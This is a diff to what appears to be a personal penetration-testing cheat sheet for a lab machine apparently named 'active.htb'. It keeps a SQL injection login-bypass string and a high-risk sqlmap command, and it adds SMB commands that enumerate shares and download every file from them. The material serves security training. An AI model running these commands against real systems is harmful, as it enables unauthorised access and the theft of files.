@@ -69,4 +69,9 @@ admin' or '1' = '1
 Copy to file login request from Burp name it "req"
 sqlmap -r req --risk=3 --level=3 --batch --force-ssl
 
-username: tony
+SMB
+smbmap -R FolderName -H 10.10.10.100 -A Filename.xml -q
+smbclient -L \\active.htb -U SVC_TGS
+smbclient //10.10.10.100/Replication
+recurse ON
+mget *
